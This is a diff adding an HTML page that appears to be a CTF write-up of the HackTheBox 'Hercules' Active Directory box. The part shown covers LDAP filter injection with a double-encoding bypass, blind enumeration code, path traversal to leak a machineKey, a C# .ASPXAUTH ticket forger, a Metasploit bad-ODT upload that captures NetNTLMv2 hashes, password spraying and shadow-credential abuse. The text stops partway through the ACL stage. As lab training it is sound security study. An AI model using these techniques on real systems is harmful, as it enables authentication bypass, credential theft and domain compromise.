@@ -1,0 +1,666 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Case File — Hercules</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Special+Elite&family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="case-file.css">
+<style>
+  .flag-redacted{
+    display:inline-block; vertical-align:middle;
+    height:15px; width:230px; max-width:60vw;
+    background: repeating-linear-gradient(90deg, var(--ink) 0 60%, transparent 0 100%);
+    background-color: var(--paper); background-size:14px 100%;
+    border-radius:2px; opacity:0.92;
+  }
+  .flag-row{display:flex;align-items:center;gap:10px;margin:10px 0;font-family:'IBM Plex Mono',monospace;font-size:0.85rem;}
+  .flag-label{color:var(--brass);text-transform:uppercase;letter-spacing:0.05em;font-size:0.72rem;min-width:64px;}
+</style>
+</head>
+<body>
+
+<nav>
+  <a href="../index.html" class="active">Dossier</a>
+  <a href="../case-files.html">Case Files</a>
+  <a href="../projects.html">Projects</a>
+  <a href="../blog.html">Blog</a>
+  <a href="../team.html">Team</a>
+  <a href="../contact.html">Contact</a>
+</nav> 
+
+<div class="topbar">
+  <a class="back" href="../case-files.html">&larr; Back to Case Files</a>
+  <span class="case-no">FILE NO. 2019-014</span>
+</div>
+
+<main>
+  <span class="file-tab">Insane · Windows AD (NTLM Disabled)</span>
+  <h1>Hercules</h1>
+  <div class="subtitle">HackTheBox</div>
+  <div class="tags">
+    <span class="tag">LDAP Filter Injection</span>
+    <span class="tag">Blind DFS Enumeration</span>
+    <span class="tag">LFI &rarr; machineKey Leak</span>
+    <span class="tag">FormsAuth Ticket Forging</span>
+    <span class="tag">Bad-ODT NetNTLMv2 Capture</span>
+    <span class="tag">Shadow Credentials</span>
+    <span class="tag">ESC3</span>
+    <span class="tag">SPN-less RBCD</span>
+    <span class="tag">DCSync</span>
+  </div>
+
+  <div class="chain">
+    <span class="node">LDAP Injection</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">Blind Enumeration</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">LFI &rarr; machineKey</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">Forged Ticket</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">Bad-ODT Capture</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">ACL Chain</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">OU Takeover</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">ESC3</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">SPN-less RBCD</span>
+    <span class="arrow">&rarr;</span>
+    <span class="node">DCSync</span>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">—</span><h2>Summary</h2></div>
+    <p>Hercules is an Insane-rated Active Directory box where NTLM is completely disabled, forcing Kerberos-only authentication throughout. The attack chain is long and multi-staged:</p>
+    <ol style="color:var(--text);font-size:0.95rem;">
+      <li>LDAP filter injection in a web SSO login form, discovered via double URL-encoding bypass of a regex blacklist</li>
+      <li>Blind username enumeration using a custom "anchor-account" oracle trick to work around an ambiguous error-message oracle</li>
+      <li>Blind LDAP attribute extraction to pull a leaked password from a user's <code>description</code> field</li>
+      <li>Kerberos password spray to find the account the leaked credential actually belongs to</li>
+      <li>Path traversal / LFI on an authenticated file-download endpoint to leak <code>web.config</code>, exposing the ASP.NET <code>machineKey</code></li>
+      <li>Forged <code>.ASPXAUTH</code> FormsAuthentication ticket using the leaked machineKey, escalating to a <code>web_admin</code> role</li>
+      <li>Bad-ODT upload to coerce an internal NetNTLMv2 authentication, captured via Responder and cracked offline</li>
+      <li>BloodHound-style ACL abuse chain: GenericWrite &rarr; Shadow Credentials &rarr; OU reparent &rarr; Shadow Credentials again &rarr; ForceChangePassword &rarr; User Flag</li>
+      <li>OU takeover on a "Forest Migration" OU, re-enabling a disabled account</li>
+      <li>ESC3 (Certificate Request Agent) abuse to mint a certificate on behalf of another user</li>
+      <li>Scheduled task abuse (<code>aCleanup.ps1</code>) to briefly re-enable a disabled service-management account</li>
+      <li>SPN-less Resource-Based Constrained Delegation using the NT-hash/session-key equalization trick, enabling S4U2Self+U2U &rarr; S4U2Proxy while impersonating Administrator</li>
+      <li>DCSync &rarr; Root Flag</li>
+    </ol>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">00</span><h2>Environment Setup</h2></div>
+    <p><strong>/etc/hosts</strong></p>
+    <pre><code>&lt;TARGET_IP&gt; hercules.htb dc.hercules.htb DC.HERCULES.HTB</code></pre>
+    <p><strong>/etc/krb5.conf</strong></p>
+    <pre><code>[libdefaults]
+    dns_lookup_kdc = false
+    dns_lookup_realm = false
+    default_realm = HERCULES.HTB
+    rdns = false
+
+[realms]
+    HERCULES.HTB = {
+        kdc = dc.hercules.htb
+        admin_server = dc.hercules.htb
+        default_domain = hercules.htb
+    }
+
+[domain_realm]
+    .hercules.htb = HERCULES.HTB
+    hercules.htb = HERCULES.HTB</code></pre>
+    <p><em>Note: <code>rdns = false</code> was needed later to stop reverse-DNS canonicalization from mangling Kerberos SPN requests (see the <code>ldapmodify</code>/GSSAPI section below).</em></p>
+    <p><strong>DNS Resolver</strong> — the box's DC also serves DNS, and hostname canonicalization depends on it. <code>/etc/resolv.conf</code> was locked with the immutable attribute on this Kali install:</p>
+    <pre><code>lsattr /etc/resolv.conf
+# ----i---------e------- /etc/resolv.conf
+sudo chattr -i /etc/resolv.conf
+echo "nameserver &lt;TARGET_IP&gt;" | sudo tee /etc/resolv.conf</code></pre>
+    <p><strong>Clock sync (critical for Kerberos)</strong> — the VM had significant clock skew from the attacker box, which breaks Kerberos pre-auth:</p>
+    <pre><code>sudo ntpdate dc.hercules.htb
+# CLOCK: time stepped by -21422.613942</code></pre>
+    <p>This was re-run every time the box was reset/restarted.</p>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">01</span><h2>Reconnaissance</h2></div>
+    <pre><code>nmap -sC -sV -Pn &lt;TARGET_IP&gt; -oN nmap_initial.txt</code></pre>
+    <pre><code>PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: hercules.htb0.)
+443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Global Catalog)
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Global Catalog SSL)
+5986/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (WinRM over SSL)
+
+Host script results:
+| smb2-security-mode: Message signing enabled and required
+|_clock-skew: (large skew observed)</code></pre>
+    <p>Full TCP port sweep confirmed no additional services beyond high ephemeral RPC ports:</p>
+    <pre><code>nmap -p- --min-rate=1000 -Pn &lt;TARGET_IP&gt; -oN nmap_allports.txt</code></pre>
+    <p>Additional port found: <code>9389/tcp</code> (ADWS — AD Web Services, confirms this is a DC).</p>
+    <p><strong>Key takeaways:</strong> full AD Domain Controller (<code>hercules.htb</code> / <code>dc.hercules.htb</code>); WinRM over SSL only (5986) — no plaintext 5985, and NTLM is disabled domain-wide, so all remote auth must use Kerberos; IIS web app on 80/443 (redirects HTTP→HTTPS) is the primary initial attack surface.</p>
+    <p>The web app (<code>https://hercules.htb/</code>) is a corporate-looking landing page ("Hercules Corp") with a dead-end contact form and navigation to <code>/Login</code>.</p>
+    <pre><code>ffuf -u https://hercules.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 40</code></pre>
+    <pre><code>/login    [Status: 200]
+/home     [Status: 302]   (redirects to /Login — auth required)
+/default  [Status: 200]
+/index    [Status: 200]</code></pre>
+    <p><code>/Login</code> renders a page titled "Hercules SSO" with Username/Password fields, "Remember me?" and a rate-limiting warning banner: <em>"New login requests are subject to rate-limiting. Suspicious session activity WILL be flagged!"</em></p>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">02</span><h2>Username Enumeration via Kerberos (Baseline)</h2></div>
+    <p>Before touching the web app, a direct Kerberos pre-auth probe confirmed two accounts exist:</p>
+    <pre><code>kerbrute userenum -d hercules.htb --dc dc.hercules.htb \
+  /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt</code></pre>
+    <pre><code>[+] VALID USERNAME:       administrator@hercules.htb
+[+] VALID USERNAME:       admin@hercules.htb
+Done! Tested 17 usernames (2 valid) in 0.816 seconds</code></pre>
+    <p><code>admin</code> became a critical "known-good" account for the LDAP injection oracle built later.</p>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">03</span><h2>LDAP Injection Discovery</h2></div>
+    <p><strong>The Username Field's Client-Side Regex</strong> — viewing the <code>/Login</code> page source revealed a <code>data-val-regex</code> on the Username field:</p>
+    <pre><code>&lt;input ... data-val-regex="Invalid Username"
+  data-val-regex-pattern="^[^!&amp;quot;#&amp;amp;&amp;#39;()*+,\:;&amp;lt;=&gt;?[\]^`{|}~]+$" ... /&gt;</code></pre>
+    <p>Decoded, the pattern rejects any username containing: <code>! " # &amp; ' ( ) * + , : ; &lt; = &gt; ? [ ] ^ \ ` { | } ~</code> — exactly the character set needed for LDAP filter injection.</p>
+    <p><strong>Confirming Server-Side Enforcement</strong> — using curl with a fresh anti-forgery token each time (ASP.NET MVC double-submit CSRF pattern):</p>
+    <pre><code>curl -sk -c cookies.txt https://hercules.htb/login -o login_page.html
+grep -o 'name="__RequestVerificationToken"[^&gt;]*value="[^"]*"' login_page.html</code></pre>
+    <p>Baseline test — valid username, wrong password:</p>
+    <pre><code>curl -sk -b cookies.txt -c cookies.txt -X POST https://hercules.htb/login \
+  --data-urlencode "__RequestVerificationToken=&lt;TOKEN&gt;" \
+  --data-urlencode "Username=admin" \
+  --data-urlencode "Password=wrongpass" \
+  --data-urlencode "RememberMe=false" \
+  -D - -o baseline_response.html</code></pre>
+    <p>Result: "Invalid login attempt". Injecting a raw single-quote (<code>admin'</code>) gave "Invalid Username" — blocked server-side too. So the blacklist is enforced both client- and server-side. Time to test the double-encoding bypass.</p>
+    <p><strong>Double URL-Encoding Bypass</strong> — a single quote URL-encodes once to <code>%27</code>. Double-encoding it (<code>%</code> &rarr; <code>%25</code>) gives <code>%2527</code>. A small Python helper pre-encoded only the blacklisted characters, letting the outer HTTP layer add the second layer:</p>
+    <pre><code>from urllib.parse import quote
+
+BANNED = set(list(r'''!"#&amp;'()*+,:;&lt;=&gt;?[]\^`{|}~'''))
+
+def encode(s: str) -&gt; str:
+    out = []
+    for c in s:
+        if c in BANNED:
+            out.append(quote(c, safe=""))
+        else:
+            out.append(c)
+    return "".join(out)</code></pre>
+    <p>Testing <code>admin%2527</code> (double-encoded quote) against the login endpoint returned "Invalid login attempt" (NOT "Invalid Username"). <mark class="rust">The bypass works.</mark> The ASP.NET pipeline decodes <code>%2527</code> twice before it reaches the LDAP filter builder, so the regex (which only sees the raw, once-decoded <code>%27</code>) never rejects it, but the final LDAP query receives a literal <code>'</code>.</p>
+    <p><strong>Confirming LDAP Wildcard Injection &amp; the Filter Boundary</strong></p>
+    <table style="width:100%;border-collapse:collapse;font-size:0.88rem;color:var(--text);margin:14px 0;">
+      <tr style="border-bottom:1px solid var(--panel-line);"><th style="text-align:left;padding:6px 0;">Payload</th><th style="text-align:left;">Result</th></tr>
+      <tr><td style="padding:6px 0;"><code>admin*</code></td><td>"Invalid login attempt"</td></tr>
+      <tr><td style="padding:6px 0;"><code>*</code></td><td>"Login attempt failed"</td></tr>
+    </table>
+    <p>Two distinct messages — a genuine oracle. Testing filter-breakout syntax:</p>
+    <pre><code>admin*)(description=*)   → blank page / "Invalid Username" (malformed filter)
+admin*)(description=*    → "Invalid login attempt" (valid — trailing ) supplied by app)</code></pre>
+    <p>This confirms the backend wraps user input as <code>(&amp;(sAMAccountName=&lt;INPUT&gt;)(...rest of filter...))</code>. Our injected <code>)</code> closes the <code>sAMAccountName</code> clause early, and removing our own trailing <code>)</code> lets the app's own closing parens complete the filter validly.</p>
+    <p><strong>The Real Meaning of the Two Messages (Important Correction)</strong> — the initial assumption (matching one reference writeup) was "Login attempt failed" = unique match, "Invalid login attempt" = no match. <mark class="rust">This was empirically wrong for this instance:</mark></p>
+    <pre><code>tests = ['admin*', 'zzzzznonexistentxyz*', '*']
+# admin*                 -&gt; invalid_login_attempt=True   (1 real match)
+# zzzzznonexistentxyz*   -&gt; invalid_login_attempt=True   (0 matches!)
+# *                      -&gt; login_attempt_failed=True    (many matches)</code></pre>
+    <p><code>admin*</code> (1 match) and a fake user (0 matches) produced the same message — the oracle only distinguishes "≤1 match" from "2+ matches", not "0" from "1". This would have produced massive false positives in a naive DFS enumeration.</p>
+    <p><strong>The Anchor-Account Fix</strong> — since <code>admin</code> is a confirmed real account, an OR-clause anchor shifted the ambiguous "0 vs 1" case into the reliable "1 vs 2+" case:</p>
+    <pre><code>def build_anchor_filter(prefix: str) -&gt; str:
+    # *)(|(sAMAccountName=admin)(sAMAccountName=&lt;prefix&gt;*)
+    return f"*)(|(sAMAccountName=admin)(sAMAccountName={prefix}*)"</code></pre>
+    <p>Prefix matches 0 real users &rarr; total matches = 1 (just admin) &rarr; "Invalid login attempt". Prefix matches 1+ real users &rarr; total matches = 2+ &rarr; "Login attempt failed" (distinguishable). Verified:</p>
+    <pre><code>zzzzznonexistentxyz -&gt; login_attempt_failed=False  (correctly: no real match)
+a                   -&gt; login_attempt_failed=True   (correctly: many real matches)
+s                   -&gt; login_attempt_failed=True
+j                   -&gt; login_attempt_failed=True
+admin               -&gt; login_attempt_failed=False  (LDAP dedupes; anchor + admin = still 1 unique DN)</code></pre>
+    <div class="why"><strong>Why this mattered</strong>This "anchor trick" — OR-ing a known-true condition into a filter to convert an ambiguous 0-vs-1 oracle into a reliable N-vs-N+1 oracle — was the single most important insight of the whole engagement; it's what made automated enumeration trustworthy.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">04</span><h2>Blind Username Enumeration (DFS)</h2></div>
+    <p>A DFS username enumerator was built using the anchor-filter oracle, plus an exact-match check (no wildcard) to confirm a candidate was a complete username:</p>
+    <pre><code>def build_anchor_filter(prefix):
+    return f"*)(|(sAMAccountName=admin)(sAMAccountName={prefix}*)"
+
+# Grammar assumed: first[.last]
+def _next_chars(prefix):
+    has_dot = '.' in prefix
+    if not prefix: return letters
+    if not has_dot: return letters + ('.' if prefix[-1].isalpha() else '')
+    return letters</code></pre>
+    <p>For every node: probe the wildcard filter; if a real match exists, also test the exact (non-wildcard) filter to see if this exact string is itself a complete username; then recurse into all 26(+dot) children regardless (since e.g. two names can coexist as both a prefix and a complete name).</p>
+    <p>Token management required care — ASP.NET's anti-forgery cookie/token pair could only be reused ~6 times before needing a refresh:</p>
+    <pre><code>class TokenManager:
+    def __init__(self, max_uses=6):
+        ...
+    def send(self, username_payload, password="wrongPassword"):
+        if self._uses &gt;= self.max_uses or not self._cookie_tok:
+            self.refresh()
+        ...</code></pre>
+    <p>Ran in background, completed in roughly 30–40 minutes (a-z sweep with dot-splitting), yielding 38 usernames plus a manually-confirmed 39th (an underscore-separated account outside the DFS grammar).</p>
+    <div class="why"><strong>Why this mattered</strong>Blind enumeration through a boolean oracle scales fine once the oracle itself is trustworthy — the real engineering cost here was building and validating the oracle, not the DFS traversal logic itself.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">05</span><h2>Blind LDAP Attribute Extraction (Description Field)</h2></div>
+    <p><strong>Checking Which Users Have a description Set</strong> — a simple existence check per user (no anchor trick needed, since we're testing a known-real single user):</p>
+    <pre><code>def build_desc_exists(username):
+    return f"{username})(description=*"
+    # real user + has description -&gt; "Login attempt failed"
+    # real user + no description  -&gt; "Invalid login attempt"</code></pre>
+    <p>Ran against all 39 usernames — only one account returned <code>has_description=True</code>.</p>
+    <p><strong>Character-by-Character Extraction</strong></p>
+    <pre><code>def ldap_escape(s):
+    # RFC4515 escaping for LDAP metacharacters
+    return s.replace('\\', r'\5c').replace('*', r'\2a') \
+             .replace('(', r'\28').replace(')', r'\29').replace('\x00', r'\00')
+
+def build_prefix_probe(username, prefix):
+    return f"{username})(description={ldap_escape(prefix)}*"</code></pre>
+    <p>For each position, try every character in <code>string.printable</code>; the first one that flips the response to "Login attempt failed" is appended and the loop continues. Extraction ran to completion, recovering a leaked credential value: <code>&lt;LEAKED_DESCRIPTION_PASSWORD&gt;</code>. This matches the pattern of an administrator embedding a "temporary" password directly into an AD description field — a very common real-world misconfiguration.</p>
+    <div class="why"><strong>Why this mattered</strong>Character-by-character blind extraction through a binary oracle is slow but completely reliable once the oracle itself is validated — patience and correct escaping matter more than cleverness here.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">06</span><h2>Kerberos Password Spray</h2></div>
+    <p>Sprayed the extracted credential across all 39 discovered usernames:</p>
+    <pre><code>kerbrute passwordspray -d hercules.htb --dc dc.hercules.htb \
+  users.txt '&lt;LEAKED_DESCRIPTION_PASSWORD&gt;' -v</code></pre>
+    <pre><code>[+] VALID LOGIN:  ken.w@hercules.htb:&lt;LEAKED_DESCRIPTION_PASSWORD&gt;</code></pre>
+    <p>Four accounts were locked out during the spray — a reminder that a single credential is often shared/reused across accounts, so blind spraying carries real lockout risk. These accounts happened to auto-unlock or become relevant again later in the chain via other means (re-enable, not password-guessing).</p>
+    <pre><code>nxc smb hercules.htb -u ken.w -p '&lt;LEAKED_DESCRIPTION_PASSWORD&gt;' --generate-krb5-file ./krb5.conf
+export KRB5_CONFIG=./krb5.conf
+nxc ldap hercules.htb -u ken.w -p '&lt;LEAKED_DESCRIPTION_PASSWORD&gt;' -k</code></pre>
+    <pre><code>LDAP  hercules.htb  389  DC  [+] hercules.htb\ken.w:&lt;LEAKED_DESCRIPTION_PASSWORD&gt;</code></pre>
+    <p>SMB and WinRM both failed for <code>ken.w</code> at this stage (NTLM disabled, and not yet privileged enough for WinRM) — only LDAP and, as it turned out, the web SSO portal accept these credentials directly.</p>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">07</span><h2>Web Portal Access &amp; LFI</h2></div>
+    <p><strong>Logging in as ken.w</strong> — using a persistent <code>requests.Session()</code> to properly track cookies across the login POST and subsequent navigation:</p>
+    <pre><code>s = requests.Session()
+r = s.get(f"{URL}/Login", ...)
+token = BeautifulSoup(r.text, "html.parser").find(
+    "input", {"name": "__RequestVerificationToken", "type": "hidden"}
+).get("value")
+
+data = {"__RequestVerificationToken": token, "Username": "ken.w",
+        "Password": "&lt;LEAKED_DESCRIPTION_PASSWORD&gt;", "RememberMe": "false"}
+r = s.post(f"{URL}/Login", data=data, ...)
+# Final URL: https://hercules.htb/Home  (Dashboard)</code></pre>
+    <p>The portal ("Hercules Portal") exposes: Dashboard, Mail, Downloads, Security, Account Details, Forms.</p>
+    <p><strong>The Downloads / LFI Endpoint</strong> — <code>/Home/Downloads</code> lists three legitimate PDF forms, each served via:</p>
+    <pre><code>&lt;form action="/Home/Download" method="get"&gt;
+  &lt;input type="hidden" name="fileName" value="registration.pdf" /&gt;</code></pre>
+    <p>i.e. <code>GET /Home/Download?fileName=registration.pdf</code>. Testing path traversal directly against <code>web.config</code> (2 directories up, a common IIS app-root depth):</p>
+    <pre><code>GET /Home/Download?fileName=../../web.config</code></pre>
+    <p><mark class="rust">Worked on the first try — no filtering on <code>fileName</code> whatsoever.</mark></p>
+    <p><strong>Extracting the machineKey</strong></p>
+    <pre><code>&lt;machineKey decryption="AES"
+  decryptionKey="&lt;DECRYPTION_KEY&gt;"
+  validation="HMACSHA256"
+  validationKey="&lt;VALIDATION_KEY&gt;" /&gt;</code></pre>
+    <p>Also visible: <code>&lt;httpRuntime targetFramework="4.8.1" /&gt;</code> and <code>&lt;compilation targetFramework="4.8" /&gt;</code> — this app runs under .NET Framework 4.8's "Framework45" FormsAuth compatibility mode (the post-padding-oracle-fix scheme, important later).</p>
+    <div class="why"><strong>Why this mattered</strong>Requiring a low-privilege login didn't stop path traversal on the download handler from leaking the entire web.config, including cryptographic material — LFI on an authenticated endpoint is still LFI.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">08</span><h2>Forging the .ASPXAUTH Cookie</h2></div>
+    <p><strong>First Attempt: Mono + a Community C# Tool (Failed)</strong> — cloned a .NET Framework 4.8 console app wrapping <code>System.Web.Security.FormsAuthentication.Encrypt/Decrypt</code>.</p>
+    <ul style="color:var(--text);font-size:0.95rem;">
+      <li><code>dotnet build</code> failed: .NET Framework 4.8 reference assemblies aren't available on the <code>dotnet</code> SDK.</li>
+      <li>Installed Mono (<code>mono-devel</code>) and compiled with <code>mcs -r:System.Web.dll</code>.</li>
+      <li>Hit a <code>NullReferenceException</code> in <code>FormsAuthentication.Initialize()</code> &rarr; <code>MapUrl()</code> — Mono's <code>FormsAuthentication</code> expects an <code>HttpContext</code>/virtual path that doesn't exist in a console app. Worked around via reflection.</li>
+      <li>Got the tool running, but self-consistency held (Mono could decrypt its own tickets) while decrypting the real server's captured cookie always failed ("Decrypt failed" / signature errors).</li>
+      <li>Root cause found by comparing raw ticket sizes: Mono's self-generated ticket was 96 bytes; the real server's captured ticket was 160 bytes for similarly-sized data. Mono's <code>FormsAuthentication</code> implementation uses an older/simpler ticket format and does not implement the modern "Framework45" anti-padding-oracle scheme the real IIS server uses. This was a dead end — not a config problem, a genuine implementation gap in Mono.</li>
+    </ul>
+    <p><strong>Working Solution: AspNetCore.LegacyAuthCookieCompat (NuGet)</strong> — a pure .NET Standard library (no <code>System.Web</code> dependency at all) that explicitly implements both <code>Framework20SP2</code> and <code>Framework45</code> compatibility modes:</p>
+    <pre><code>mkdir -p ~/tools/CookieForge &amp;&amp; cd ~/tools/CookieForge
+dotnet new console -o .
+dotnet add package AspNetCore.LegacyAuthCookieCompat</code></pre>
+    <p><code>Program.cs</code>:</p>
+    <pre><code>using System;
+using AspNetCore.LegacyAuthCookieCompat;
+
+class Program
+{
+    static void Main(string[] args)
+    {
+        string decryptionKeyHex = "&lt;DECRYPTION_KEY&gt;";
+        string validationKeyHex = "&lt;VALIDATION_KEY&gt;";
+
+        byte[] decryptionKeyBytes = HexUtils.HexToBinary(decryptionKeyHex);
+        byte[] validationKeyBytes = HexUtils.HexToBinary(validationKeyHex);
+
+        if (args[0] == "decrypt")
+        {
+            foreach (var sha in new[] { ShaVersion.Sha256, ShaVersion.Sha1 })
+            {
+                try
+                {
+                    var encryptor = new LegacyFormsAuthenticationTicketEncryptor(
+                        decryptionKeyBytes, validationKeyBytes, sha);
+                    var ticket = encryptor.DecryptCookie(args[1]);
+                    Console.WriteLine($"[+] SUCCESS with {sha}");
+                    Console.WriteLine($"Name: {ticket.Name}, UserData: {ticket.UserData}");
+                    return;
+                }
+                catch (Exception ex) { Console.WriteLine($"[-] Failed with {sha}: {ex.Message}"); }
+            }
+        }
+        else if (args[0] == "encrypt")
+        {
+            string username = args.Length &gt; 1 ? args[1] : "web_admin";
+            int hours = args.Length &gt; 2 &amp;&amp; int.TryParse(args[2], out var h) ? h : 8;
+            var ticket = new FormsAuthenticationTicket(
+                1, username, DateTime.UtcNow, DateTime.UtcNow.AddHours(hours),
+                true, "Web Administrators", "/");
+
+            foreach (var sha in new[] { ShaVersion.Sha256, ShaVersion.Sha1 })
+            {
+                var encryptor = new LegacyFormsAuthenticationTicketEncryptor(decryptionKeyBytes, validationKeyBytes, sha);
+                Console.WriteLine($"=== {sha} ===\n{encryptor.Encrypt(ticket)}\n");
+            }
+        }
+    }
+}</code></pre>
+    <p><strong>Validating Against a Real Captured Cookie</strong></p>
+    <pre><code>dotnet run decrypt &lt;CAPTURED_TICKET&gt;</code></pre>
+    <pre><code>[+] SUCCESS with Sha256
+Name       : ken.w
+UserData   : Web Users
+Issued     : &lt;TIMESTAMP&gt;
+Expires    : &lt;TIMESTAMP&gt;</code></pre>
+    <p>Exact confirmation the real server's ticket decrypts correctly with this library and the extracted machineKey.</p>
+    <p><strong>Forging a web_admin Ticket</strong></p>
+    <pre><code>dotnet run encrypt web_admin 8</code></pre>
+    <pre><code>=== Sha256 ===
+&lt;FORGED_TICKET&gt;</code></pre>
+    <p>This ticket, set as the <code>.ASPXAUTH</code> cookie value against <code>hercules.htb</code>, granted access to the portal as <strong>web_admin</strong>.</p>
+    <div class="why"><strong>Why this mattered</strong>A leaked machineKey means full authentication bypass, but the specific .NET compatibility mode matters a great deal for tooling — Mono's real ASP.NET code silently produced wrong (but not obviously "broken") output, while a community .NET-Standard reimplementation that explicitly supports both modes proved far more reliable for offline ticket forgery.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">09</span><h2>Bad-ODT Upload &rarr; NetNTLMv2 Capture</h2></div>
+    <p><strong>Locating the Upload Endpoint</strong> — as web_admin (using the forged cookie via curl), <code>/Home/Forms</code> renders an authenticated "Report Submission" form:</p>
+    <pre><code>ASPXAUTH="&lt;FORGED_TICKET&gt;"
+curl -sk "https://hercules.htb/Home/Forms" -H "Cookie: .ASPXAUTH=$ASPXAUTH" \
+  -c cookies.txt -o forms_page.html
+grep -o '__RequestVerificationToken[^&gt;]*value="[^"]*"' forms_page.html</code></pre>
+    <p>Fields identified: Name, Email, Description, UploadedFile (type=file).</p>
+    <p><strong>Generating the Malicious ODT</strong></p>
+    <pre><code>sudo msfconsole -q
+use auxiliary/fileformat/odt_badodt
+set creator burrito
+set filename evil.odt
+set lhost &lt;KALI_VPN_IP&gt;
+run
+# [+] evil.odt stored at /root/.msf4/local/evil.odt</code></pre>
+    <pre><code>sudo cp /root/.msf4/local/evil.odt ~/tools/CookieForge/evil.odt
+sudo chown burrito:burrito ~/tools/CookieForge/evil.odt</code></pre>
+    <p><strong>Listener + Upload</strong></p>
+    <pre><code>sudo responder -I tun0 -wv</code></pre>
+    <pre><code>curl -sk "https://hercules.htb/Home/Forms" \
+  -H "Cookie: .ASPXAUTH=$ASPXAUTH; __RequestVerificationToken=&lt;COOKIE_TOKEN&gt;" \
+  -F "__RequestVerificationToken=&lt;FORM_TOKEN&gt;" \
+  -F "Name=burrito" -F "Email=burrito@test.com" -F "Description=test upload" \
+  -F "UploadedFile=@evil.odt;type=application/vnd.oasis.opendocument.text" \
+  -o response.html -w "HTTP Status: %{http_code}\n"</code></pre>
+    <pre><code>HTTP Status: 200
+"Thank you for your report!"</code></pre>
+    <p>Within moments, Responder captured multiple retries of a NetNTLMv2 hash for a domain account (a backend process auto-opens submitted reports, presumably as part of a triage/QA workflow — an intentional "assisted phishing" vector on this box):</p>
+    <pre><code>[SMB] NTLMv2-SSP Username : HERCULES\natalie.a
+[SMB] NTLMv2-SSP Hash     : &lt;NTLMV2_HASH&gt;</code></pre>
+    <p><strong>Cracking</strong></p>
+    <pre><code>hashcat -m 5600 natalie_hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+    <pre><code>NATALIE.A::HERCULES:...:&lt;NATALIE_PASSWORD&gt;
+Status...........: Cracked</code></pre>
+    <div class="why"><strong>Why this mattered</strong>Any feature that opens a submitted document automatically, even as an internal "triage" process, is a phishing vector against the service account doing the opening — a bad-ODT payload here works exactly like it would against a real human reviewer.</div>
+  </div>
+
+  <div class="stage">
+    <div class="stage-head"><span class="stage-no">10</span><h2>BloodHound-Style ACL Chain &rarr; User Flag</h2></div>
+    <pre><code>impacket-getTGT hercules.htb/'natalie.a':'&lt;NATALIE_PASSWORD&gt;' -dc-ip &lt;TARGET_IP&gt;
+export KRB5CCNAME=natalie.a.ccache
+
+bloodhound-python -dc dc.hercules.htb -d hercules.htb \
+  -u natalie.a -p '&lt;NATALIE_PASSWORD&gt;' -k -ns &lt;TARGET_IP&gt; --zip -c All</code></pre>
+    <pre><code>INFO: Found 49 users, 62 groups, 2 gpos, 9 ous, 19 containers</code></pre>
+    <p><strong>GenericWrite on bob.w &rarr; Shadow Credentials</strong> — manual ACE inspection via bloodyAD confirmed WriteProperty rights over <code>name</code>/<code>distinguishedName</code> on <code>bob.w</code> (granted via a group SID, not natalie.a's own SID directly — the ACL was inherited/group-based):</p>
+    <pre><code>export KRB5CCNAME=natalie.a.ccache
+certipy-ad shadow auto -u 'natalie.a@HERCULES.HTB' -k -no-pass \
+  -dc-host dc.hercules.htb -account 'bob.w' -ns &lt;TARGET_IP&gt;</code></pre>
+    <pre><code>[*] NT hash for 'bob.w': &lt;NT_HASH&gt;</code></pre>
+    <p><strong>Reparenting stephen.m into bob.w's Controlled OU</strong> — bob.w held the same WriteProperty pattern over stephen.m (originally in a Security Department OU). Attempted the classic <code>ldapmodify -Y GSSAPI</code> MODRDN approach first:</p>
+    <pre><code>cat &gt; mov.ldif &lt;&lt; 'EOF'
+dn: CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
+changetype: modrdn
+newrdn: CN=Stephen Miller
+deleteoldrdn: 1
+newsuperior: OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
+EOF
+
+export KRB5CCNAME=bob.w.ccache
+ldapmodify -H ldap://DC.HERCULES.HTB -Y GSSAPI -f mov.ldif</code></pre>
